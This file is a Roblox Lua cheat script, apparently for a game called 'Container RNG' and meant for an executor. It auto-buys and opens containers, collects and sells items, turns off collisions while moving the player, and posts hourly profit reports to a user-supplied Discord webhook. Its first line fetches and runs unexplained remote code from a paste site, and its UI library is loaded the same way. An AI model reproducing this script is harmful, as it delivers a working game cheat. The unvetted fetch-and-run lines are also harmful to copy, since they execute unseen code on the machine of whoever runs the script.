loadstring(game:HttpGet("https://pastefy.app/QSK04J2d/raw"))()

-- // Variables \\
local library = loadstring(game:HttpGet("https://pastefy.app/gUEb2jc7/raw"))()
local players = game:GetService("Players")
local tweenService = game:GetService("TweenService")
local StarterGui = game:GetService("StarterGui")
local HttpService = game:GetService("HttpService")
local localPlayer = players.LocalPlayer

local players     = game:GetService("Players")
local tweenService= game:GetService("TweenService")
local StarterGui  = game:GetService("StarterGui")
local HttpService = game:GetService("HttpService")
local localPlayer = players.LocalPlayer

-- =========================
--  CONFIG + WEBHOOK (single file in Workspace)
-- =========================

-- Android-friendly single JSON in Workspace (no subfolder)
local haveFS = (typeof(isfile)=="function" and typeof(writefile)=="function"
    and typeof(readfile)=="function" and typeof(makefolder)=="function" and typeof(isfolder)=="function")

local CONFIG_PATH = "workspace/BozakContainerRng_config.json"

-- Ensure Workspace exists (Delta: /storage/emulated/0/Delta/Workspace)
if haveFS then
    pcall(function()
        if not isfolder("workspace") then makefolder("workspace") end
    end)
end

-- Runtime config (webhook not hardcoded)
local Config = {
    webhookURL      = "",     -- paste your Discord webhook here (in the JSON file or via UI textbox)
    webhookEnabled  = true,
    hourlyEnabled   = true,   -- send report every hour
    trackItems      = true,   -- parse notifications to detect best item
    -- persist your toggles between runs:
    autoBuy         = nil,
    autoFarm        = nil,
    autoCollect     = nil,
    autoSell        = nil,
    selectedTier    = nil,
}

local function saveConfig()
    if not haveFS then return end
    local ok, json = pcall(function() return HttpService:JSONEncode(Config) end)
    if ok then pcall(function() writefile(CONFIG_PATH, json) end) end
end

local function loadConfig()
    if not haveFS or not isfile(CONFIG_PATH) then
        -- first run: write starter config
        local ok, json = pcall(function() return HttpService:JSONEncode(Config) end)
        if ok then pcall(function() writefile(CONFIG_PATH, json) end) end
        return
    end
    local ok, json = pcall(function() return readfile(CONFIG_PATH) end)
    if not ok or not json then return end
    local ok2, tbl = pcall(function() return HttpService:JSONDecode(json) end)
    if ok2 and type(tbl)=="table" then
        for k,v in pairs(tbl) do Config[k]=v end
    end
end

loadConfig()

-- HTTP request helper (executor-friendly)
local function http_post_json(url, bodyTable)
    if type(url)~="string" or url=="" then return false, "no url" end
    local ok, bodyStr = pcall(function() return HttpService:JSONEncode(bodyTable) end)
    if not ok then return false, "encode fail" end

    local req = nil
    if syn and syn.request then req = syn.request
    elseif http and http.request then req = http.request
    elseif http_request then req = http_request
    elseif request then req = request end

    if req then
        local resp = req({
            Url = url,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = bodyStr
        })
        return resp and (resp.StatusCode >= 200 and resp.StatusCode < 300), resp
    else
        local ok2, err = pcall(function()
            HttpService:PostAsync(url, bodyStr, Enum.HttpContentType.ApplicationJson)
        end)
        return ok2, err
    end
end

-- money helpers (safe)
local function getCurrentMoneySafe()
    local ok, text = pcall(function()
        return localPlayer.PlayerGui.CurrencyUI.MainFrame.StatsFrame.Money.Amount.Text
    end)
    if not ok or not text then return 0 end
    return tonumber((text or "0"):gsub(",", "")) or 0
end

-- session anchors
local sessionStartMoney = getCurrentMoneySafe()
local hourAnchorMoney   = sessionStartMoney

-- best item tracking for THIS session
local bestItem = { name = nil, price = 0, muts = nil, size = nil }

-- parse notification text to update bestItem (very tolerant)
local function scanAndTrackBestItem()
    local pg = localPlayer:FindFirstChild("PlayerGui"); if not pg then return end
    local sg = pg:FindFirstChild("ScreenGui")
    local nf = sg and sg:FindFirstChild("NotificationFrame")
    local n  = nf and nf:FindFirstChild("Notification")
    local lbl= n and n:FindFirstChild("NotificationText")
    local txt = (lbl and lbl.Text) or ""
    if type(txt)~="string" or #txt==0 then return end

    -- examples it handles: "You found X worth $1,234,567", "Unboxed X worth $1,234"
    local name  = txt:match("found%s+([%w%s%p]-)%s+worth") or txt:match("Unboxed%s+([%w%s%p]-)%s+worth")
    local money = txt:match("%$([%d,]+)")
    local muts  = txt:match("Mutations:%s*(%d+)") or txt:match("Muts:%s*(%d+)")
    local size  = txt:match("Size:%s*([%d%.]+)")  -- e.g. Size: 1.23

    if money then
        local val = tonumber((money:gsub(",", ""))) or 0
        if val > (bestItem.price or 0) then
            bestItem.price = val
            bestItem.name  = name or "Unknown Item"
            bestItem.muts  = muts or bestItem.muts
            bestItem.size  = size or bestItem.size
        end
    end
end

-- avatar + username for webhook appearance
local function getPlayerAvatarUrl()
    local userId = players.LocalPlayer.UserId
    return ("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png"):format(userId)
end

-- formatting
local function formatMoney(n)
    local s = tostring(math.floor(n or 0))
    local neg = s:sub(1,1)=="-"
    if neg then s=s:sub(2) end
    local r = s:reverse():gsub("(%d%d%d)","%1,"):reverse():gsub("^,","")
    return (neg and "-" or "") .. r
end

-- webhook: ONLY the most expensive item this session, plus money + net profit + muts/size
local function sendBestItemWebhook()
    if not Config.webhookEnabled or (Config.webhookURL or "") == "" then return end

    local nowMoney = getCurrentMoneySafe()
    local netProfit = nowMoney - sessionStartMoney

    local title = "🏆 Best Item This Session"
    local description

    if bestItem.price > 0 then
        description = ("**Item:** %s\n**Worth:** $%s\n**Mutations:** %s\n**Size:** %s\n\n💰 **Current Money:** $%s\n📈 **Net Profit (session):** $%s")
            :format(
                bestItem.name or "Unknown Item",
                formatMoney(bestItem.price),
                bestItem.muts or "?",
                bestItem.size or "?",
                formatMoney(nowMoney),
                formatMoney(netProfit)
            )
    else
        description = ("_No item detected yet this session._\n\n💰 **Current Money:** $%s\n📈 **Net Profit (session):** $%s")
            :format(formatMoney(nowMoney), formatMoney(netProfit))
    end

    local payload = {
        username = players.LocalPlayer.Name,
        avatar_url = getPlayerAvatarUrl(),
        embeds = {{
            title = title,
            description = description,
            color = 0x00B2FF,
            timestamp = DateTime.now():ToIsoDate(),
            footer = { text = "Container RNG Auto Report" }
        }}
    }

    http_post_json(Config.webhookURL, payload)
end

-- light background jobs:
-- A) Scrape notifications (best item tracker)
task.spawn(function()
    while true do
        if Config.trackItems then
            pcall(scanAndTrackBestItem)
        end
        task.wait(0.5)
    end
end)

-- B) Hourly embed (best item only + money + profit)
task.spawn(function()
    while true do
        for _ = 1, 3600 do task.wait(1) end
        if Config.hourlyEnabled then
            pcall(sendBestItemWebhook)
            hourAnchorMoney = getCurrentMoneySafe()
        end
    end
end)

-- Toggles
local selectedContainer = "Junk"
local autoBuyContainer = false
local autoFarmContainers = false
local autoCollectItems = false
local autoSellItems = false

-- load any persisted toggles
if type(Config.autoBuy)=="boolean" then autoBuyContainer = Config.autoBuy end
if type(Config.autoFarm)=="boolean" then autoFarmContainers = Config.autoFarm end
if type(Config.autoCollect)=="boolean" then autoCollectItems = Config.autoCollect end
if type(Config.autoSell)=="boolean" then autoSellItems = Config.autoSell end
if type(Config.selectedTier)=="string" then selectedContainer = Config.selectedTier end

-- Autosave the config occasionally (keeps webhook + toggles current)
task.spawn(function()
    while true do
        task.wait(20)
        Config.autoBuy       = autoBuyContainer
        Config.autoFarm      = autoFarmContainers
        Config.autoCollect   = autoCollectItems
        Config.autoSell      = autoSellItems
        Config.selectedTier  = selectedContainer
        saveConfig()
    end
end)

-- Temps / state
local localPlot
local itemCache
local isTweening = false
local inventoryFull = false
local tweeningSpeed = 30

-- --- SAFETY HELPERS ---
local function getWorldPos(inst)
    if not inst then return nil end
    if inst:IsA("BasePart") then return inst.Position end
    if inst:IsA("Attachment") then return inst.WorldPosition end
    if inst:IsA("Model") then
        local p = inst.PrimaryPart
        if p then return p.Position end
        local cf = inst:GetPivot()
        return cf and cf.Position or nil
    end
    local p = inst:FindFirstAncestorWhichIsA("BasePart")
    return p and p.Position or nil
end

local function waitUntil(fn, timeout)
    local t0 = os.clock()
    local lim = timeout or 8
    while not fn() do
        if os.clock() - t0 > lim then return false end
        task.wait(0.15)
    end
    return true
end

local function ensureRefs()
    if (not localPlot) or (not localPlot.Parent) then
        local plots = workspace:WaitForChild("Gameplay"):WaitForChild("Plots")
        for i = 1, #plots:GetChildren() do
            local slot = plots:FindFirstChild(tostring(i))
            if slot then
                local ok, txt = pcall(function()
                    return slot.PlotLogic.PlotNameSign.PlayerInfoSign.PlayerNameSign.MainFrame.NameLabel.Text
                end)
                if ok and txt == (localPlayer.Name .. "'s Market") then
                    localPlot = slot
                    break
                end
            end
        end
    end
    if localPlot and (not itemCache or not itemCache.Parent) then
        itemCache = localPlot.PlotLogic and localPlot.PlotLogic:FindFirstChild("ItemCache")
    end
    return localPlot ~= nil
end

-- Finds the clickable (TextButton/ImageButton) for a label with given text.
local function findClickableForLabel(txt, ignoreAncestorName)
    local g = localPlayer:FindFirstChild("PlayerGui")
    if not g then return nil end
    for _, d in ipairs(g:GetDescendants()) do
        if d:IsA("TextLabel") and d.Text == txt then
            if ignoreAncestorName and d:FindFirstAncestor(ignoreAncestorName) then
                -- skip preview/info panes
            else
                local a = d
                for _ = 1, 5 do
                    a = a and a.Parent
                    if not a then break end
                    if a:IsA("TextButton") or a:IsA("ImageButton") then
                        return a
                    end
                end
                local c = d.Parent
                if c then
                    local btn = c:FindFirstChildWhichIsA("TextButton", true)
                             or c:FindFirstChildWhichIsA("ImageButton", true)
                    if btn then return btn end
                    for _, s in ipairs(c:GetChildren()) do
                        if s:IsA("TextButton") or s:IsA("ImageButton") then
                            return s
                        end
                    end
                end
            end
        end
    end
    return nil
end

-- container slot count (tolerant)
local function getMaxContainers()
    if not ensureRefs() then return 0 end
    local slotsFolder = localPlot.PlotLogic:FindFirstChild("ContainerSlots")
    if not slotsFolder then return 0 end
    local badColor = "0 1 0 0 0 1 1 0 0 0 "
    local slots = 0
    for _, v in pairs(slotsFolder:GetChildren()) do
        local lb = v:FindFirstChild("LeftBeam")
        if not lb or tostring(lb.Color) ~= badColor then
            slots = slots + 1
        end
    end
    return slots
end

-- // Functions \\
local function getCurrentMoney()
    local ok, text = pcall(function()
        return localPlayer.PlayerGui.CurrencyUI.MainFrame.StatsFrame.Money.Amount.Text
    end)
    if not ok or not text then return 0 end
    return tonumber(text:gsub(",", "")) or 0
end

-- Tween to world position (fixed math)
local function tween(position)
    local root = localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart")
    if not root then return "no root" end
    isTweening = true
    local dist = (root.Position - position).Magnitude
    local speed = math.max(5, tweeningSpeed)
    local tw = tweenService:Create(
        root,
        TweenInfo.new(dist / speed, Enum.EasingStyle.Linear),
        { CFrame = CFrame.new(position, position + root.CFrame.LookVector) }
    )
    tw:Play()
    tw.Completed:Wait()
    isTweening = false
    local c = localPlayer.Character
    if not c or not c:FindFirstChild("HumanoidRootPart") then return "no root" end
    return "success"
end

local function sell()
    if not autoSellItems then return false end
    local g = localPlayer:FindFirstChild("PlayerGui")
    local notif = g and g:FindFirstChild("ScreenGui")
    notif = notif and notif:FindFirstChild("NotificationFrame")
    notif = notif and notif:FindFirstChild("Notification")
    local lbl = notif and notif:FindFirstChild("NotificationText")
    if not (lbl and lbl:IsA("TextLabel") and lbl.Text:find("INVENTORY IS FULL")) then
        return false
    end

    inventoryFull = true
    local house = localPlot.PlotDecor and localPlot.PlotDecor.House and localPlot.PlotDecor.House:FindFirstChild("Part")
    local p = getWorldPos(house) or (localPlot:GetPivot() and localPlot:GetPivot().Position + Vector3.new(0,5,0))
    if not p then return "no root" end
    if tween(p + Vector3.new(0,5,0)) == "no root" then return "no root" end

    pcall(function()
        firesignal(localPlayer.PlayerGui.BackpackGui.Backpack.Hotbar.DropAll.MouseButton1Click)
    end)
    task.wait(1.5)
    pcall(function()
        StarterGui:SetCore("SendNotification", { Title = "Sold", Text = "Your items were dropped/sold", Duration = 10 })
    end)
    inventoryFull = false
    return true
end

-- UI
local window = library.Window()
local autofarmTab = window.Tab("Autofarm")
local autoBuySection = autofarmTab.Section("Auto Buy")
autoBuySection.Toggle("Auto Buy Container", function(on)
    autoBuyContainer = on
    Config.autoBuy = on; saveConfig()
end)
local autoContainerSection = autofarmTab.Section("Auto Container")
autoContainerSection.Toggle("Auto Farm Container", function(on)
    autoFarmContainers = on
    Config.autoFarm = on; saveConfig()
end)
autoContainerSection.Toggle("Pick Up Items", function(on)
    autoCollectItems = on
    Config.autoCollect = on; saveConfig()
end)
autoContainerSection.Toggle("Sell Picked Up Items", function(on)
    autoSellItems = on
    Config.autoSell = on; saveConfig()
end)
local autofarmSettingsSection = autofarmTab.Section("Select")
local settingsTab = window.Tab("Settings")
local settingsSection = settingsTab.Section("Settings")
settingsSection.Slider("Farming Speed", 10, 120, 30, function(v) tweeningSpeed = v end)

-- Webhook UI (paste webhook in-game if your lib supports Textbox)
local webhookSection = settingsTab.Section("Webhook / Reports")
webhookSection.Toggle("Enable Webhook", function(on)
    Config.webhookEnabled = on
    saveConfig()
end)
webhookSection.Toggle("Hourly Embed (Best Item + Money + Profit)", function(on)
    Config.hourlyEnabled = on
    saveConfig()
end)
if type(webhookSection.Textbox) == "function" then
    webhookSection.Textbox("Discord Webhook URL", Config.webhookURL or "", function(text)
        Config.webhookURL = text or ""
        saveConfig()
    end)
end
webhookSection.Button("Send Best Item Now", function()
    pcall(sendBestItemWebhook)
end)

-- Prices (fixed "Deep Space")
local containerMeta = {
    Junk=100,Scratched=200,Sealed=700,
    Military=3000,Metal=10000,Frozen=25000,
    Lava=50000,Corrupted=100000,Stormed=250000,
    Lightning=500000,Infernal=750000,
    Mystic=1500000,Glitched=5000000,
    Astral=10000000,Dream=25000000,
    Celestial=50000000,Fire=100000000,
    Golden=250000000,Diamond=500000000,
    Emerald=2500000000,Ruby=10000000000,
    Sapphire=75000000000,Space=150000000000,
    ["Deep Space"]=500000000000,Vortex=1000000000000,["Black Hole"]=2500000000000
}
local names = {}
for k in pairs(containerMeta) do table.insert(names, k) end
table.sort(names)
autofarmSettingsSection.Dropdown("Container Name", names, "Junk", function(v)
    selectedContainer = v
    Config.selectedTier = v; saveConfig()
end)

-- ===== Main Loop =====
task.spawn(function()
    ensureRefs()
    itemCache = localPlot and localPlot.PlotLogic and localPlot.PlotLogic:FindFirstChild("ItemCache")

    repeat
        -- close StarterPack popup if present
        pcall(function()
            local sp = localPlayer.PlayerGui.MenusUI:FindFirstChild("StarterPack")
            if sp and sp:FindFirstChild("CloseButton") then
                firesignal(sp.CloseButton.MouseButton1Click)
            end
        end)

        if ensureRefs() and #localPlot.PlotLogic.ContainerHolder:GetChildren() ~= 0 then
            -- ===== FARM =====
            if autoFarmContainers and not inventoryFull then
                for idx, model in ipairs(localPlot.PlotLogic.ContainerHolder:GetChildren()) do
                    if not model or not model.Parent then continue end

                    local logic = model:FindFirstChild("ContainerLogic")
                    local holder = logic and logic:FindFirstChild("DoorProximityHolder")
                    local prompt = holder and (holder:FindFirstChildOfClass("ProximityPrompt")
                                    or holder:FindFirstChildWhichIsA("ProximityPrompt", true))

                    if holder and not prompt then
                        -- no prompt yet: try to pick items already lying inside this container
                        if itemCache then
                            for _, item in ipairs(itemCache:GetChildren()) do
                                local primary = item:FindFirstChild("PrimaryPart")
                                if not primary then continue end
                                local itemPos = primary.Position

                                local contPos = getWorldPos(model:FindFirstChild("Container")) or getWorldPos(model)
                                if not contPos then continue end

                                local ok, cf, size = pcall(function() local a,b=model:GetBoundingBox(); return a,b end)
                                if not ok or not cf or not size then continue end
                                local rel = cf:PointToObjectSpace(itemPos)
                                local half = size * 0.5
                                local planar = ((itemPos * Vector3.new(1,0,1)) - (contPos * Vector3.new(1,0,1))).Magnitude <= 31
                                if not (planar and math.abs(rel.X) <= half.X and math.abs(rel.Z) <= half.Z) then continue end

                                local pos = getWorldPos(item) or itemPos
                                local hrp = localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart")
                                if pos and hrp then
                                    tween(Vector3.new(pos.X, hrp.Position.Y, pos.Z))
                                    if autoCollectItems and autoFarmContainers then
                                        local pp = item:FindFirstChildOfClass("ProximityPrompt") or item:FindFirstChildWhichIsA("ProximityPrompt", true)
                                        if pp then pcall(function() fireproximityprompt(pp) end) end
                                    end
                                    -- ping parser to catch fresh notifications
                                    pcall(scanAndTrackBestItem)
                                    local sold = sell()
                                    if sold ~= false then break end
                                end
                            end
                        end
                    else
                        -- open container
                        task.wait(0.2)
                        local p = getWorldPos(holder)
                        if p then
                            local tw = tween(p + Vector3.new(0, 12, 0))
                            if tw == "success" then
                                if prompt then pcall(function() fireproximityprompt(prompt) end) end
                                pcall(function()
                                    StarterGui:SetCore("SendNotification", { Title = "Opened Container", Text = ("Container #%d was opened."):format(idx), Duration = 10 })
                                end)

                                if autoCollectItems then
                                    local mp = getWorldPos(model)
                                    if mp and tween(mp) == "success" then
                                        -- WAIT before first collection + MULTI PASS
                                        task.wait(2)  -- give time for items to spawn

                                        if itemCache then
                                            for pass = 1, 3 do   -- do a few sweeps for late spawns
                                                if pass > 1 then task.wait(1.5) end
                                                for _, item in ipairs(itemCache:GetChildren()) do
                                                    local primary = item:FindFirstChild("PrimaryPart")
                                                    if not primary then continue end
                                                    local itemPos = primary.Position

                                                    local contPos = getWorldPos(model:FindFirstChild("Container")) or getWorldPos(model)
                                                    if not contPos then continue end

                                                    local ok2, cf, size = pcall(function() local a,b=model:GetBoundingBox(); return a,b end)
                                                    if not ok2 or not cf or not size then continue end
                                                    local rel = cf:PointToObjectSpace(itemPos)
                                                    local half = size * 0.5
                                                    local planar = ((itemPos * Vector3.new(1,0,1)) - (contPos * Vector3.new(1,0,1))).Magnitude <= 31
                                                    local inside = planar and math.abs(rel.X) <= half.X and math.abs(rel.Y) <= half.Y and math.abs(rel.Z) <= half.Z
                                                    if inside then
                                                        local pos = getWorldPos(item) or itemPos
                                                        local hrp = localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart")
                                                        if pos and hrp then
                                                            tween(Vector3.new(pos.X, hrp.Position.Y, pos.Z))
                                                            if autoCollectItems and autoFarmContainers then
                                                                local pp = item:FindFirstChildOfClass("ProximityPrompt") or item:FindFirstChildWhichIsA("ProximityPrompt", true)
                                                                if pp then pcall(function() fireproximityprompt(pp) end) end
                                                            end
                                                            pcall(scanAndTrackBestItem)
                                                            local sold = sell()
                                                            if sold ~= false then break end
                                                        end
                                                    end
                                                end
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
            end

        else
            -- ======= AUTO-BUY with RETRIES =======
            if autoBuyContainer then
                local holder = localPlot.PlotLogic and localPlot.PlotLogic:FindFirstChild("ContainerHolder")
                if not (holder and #holder:GetChildren() > 0) then

                    local function openComputer()
                        if not ensureRefs() then return false end
                        local comp = localPlot.PlotLogic
                            and localPlot.PlotLogic:FindFirstChild("ComputerSystem")
                            and localPlot.PlotLogic.ComputerSystem:FindFirstChild("ComputerProximityHolder")
                        local pos = getWorldPos(comp)
                        if not pos then return false end
                        if tween(Vector3.new(pos.X, pos.Y + 5, pos.Z)) == "no root" then return false end
                        local pp = comp and (comp:FindFirstChildOfClass("ProximityPrompt")
                                   or comp:FindFirstChildWhichIsA("ProximityPrompt", true))
                        if not pp then return false end
                        pcall(function() fireproximityprompt(pp) end)
                        return true
                    end

                    local function openContainerShop()
                        local btn
                        local ok = waitUntil(function()
                            btn = findClickableForLabel("ContainerEx")
                            return btn ~= nil
                        end, 6)
                        if not ok or not btn then return false end
                        pcall(function() firesignal(btn.MouseButton1Click) end)
                        return true
                    end

                    local function selectContainer(name)
                        local want = name .. " Container"
                        local btn
                        local ok = waitUntil(function()
                            btn = findClickableForLabel(want, "InfoHolder")
                            return btn ~= nil
                        end, 6)
                        if not ok or not btn then return false end
                        pcall(function() firesignal(btn.MouseButton1Click) end)
                        return true
                    end

                    local function buyToFill()
                        local h = localPlot.PlotLogic and localPlot.PlotLogic:FindFirstChild("ContainerHolder")
                        if not h then return false end
                        local toFill = math.max(0, getMaxContainers() - #h:GetChildren())
                        if toFill <= 0 then return true end

                        -- EXTRA SAFETY: wait before pressing "Regular" so tier actually switches
                        task.wait(2)  -- <<< avoid accidental Junk purchase

                        local g = localPlayer:FindFirstChild("PlayerGui")
                        local shop = g and g:FindFirstChild("MenusUI") and g.MenusUI:FindFirstChild("ContainerShop")
                        local buyBtn = shop and shop:FindFirstChild("RegularButton", true)
                        if not buyBtn then
                            local fb = findClickableForLabel("Regular")
                            if fb then buyBtn = fb end
                        end
                        if not buyBtn then return false end

                        for _ = 1, toFill do
                            pcall(function() firesignal(buyBtn.MouseButton1Click) end)
                            task.wait(0.12)
                        end
                        pcall(function()
                            local closeBtn = shop and shop:FindFirstChild("ButtonHolder") and shop.ButtonHolder:FindFirstChild("CloseButton")
                            if closeBtn then firesignal(closeBtn.MouseButton1Click) end
                        end)

                        local ok = waitUntil(function()
                            local hh = localPlot.PlotLogic and localPlot.PlotLogic:FindFirstChild("ContainerHolder")
                            return hh and (#hh:GetChildren() == getMaxContainers() or #hh:GetChildren() > 0) or false
                        end, 30)
                        return ok
                    end

                    local function buySelectedContainerWithRetry(name, retries)
                        retries = retries or 4

                        for attempt = 1, retries do
                            -- if containers appear mid-flow, exit
                            local hh = localPlot.PlotLogic and localPlot.PlotLogic:FindFirstChild("ContainerHolder")
                            if hh and #hh:GetChildren() > 0 then return true end

                            StarterGui:SetCore("SendNotification", {
                                Title = ("Buying (attempt %d/%d)"):format(attempt, retries),
                                Text  = "Trying to purchase container...",
                                Duration = 5
                            })

                            -- FIRST DELAY before the whole buy to avoid fast-default Junk
                            task.wait(2)  -- <<< global pre-buy wait

                            if openComputer() and openContainerShop() and selectContainer(name) then
                                -- SECOND DELAY after selecting tier to ensure it applied
                                task.wait(2)  -- <<< post-select wait
                                if buyToFill() then
                                    return true
                                end
                            end

                            -- Backoff while watching for manual purchase
                            local appeared = waitUntil(function()
                                local h2 = localPlot.PlotLogic and localPlot.PlotLogic:FindFirstChild("ContainerHolder")
                                return h2 and #h2:GetChildren() > 0
                            end, math.max(1, 0.75 * attempt))
                            if appeared then return true end
                        end
                        return false
                    end

                    local ok = buySelectedContainerWithRetry(selectedContainer, 4)
                    if not ok then
                        StarterGui:SetCore("SendNotification", {
                            Title = "Buy failed",
                            Text  = "Will retry automatically.",
                            Duration = 6
                        })
                    end
                end
            end
        end

        task.wait(0.1)
    until false
end)

-- // Tweening safety loop \\
task.spawn(function()
    while true do
        local char = localPlayer.Character
        local root = char and char:FindFirstChild("HumanoidRootPart")
        if char and root then
            if isTweening then
                root.Velocity = Vector3.new()
                for _, v in ipairs(char:GetChildren()) do
                    if v:IsA("BasePart") then v.CanCollide = false end
                end
            else
                for _, v in ipairs(char:GetChildren()) do
                    if v:IsA("BasePart") then v.CanCollide = true end
                end
            end
        end
        task.wait()
    end
end)

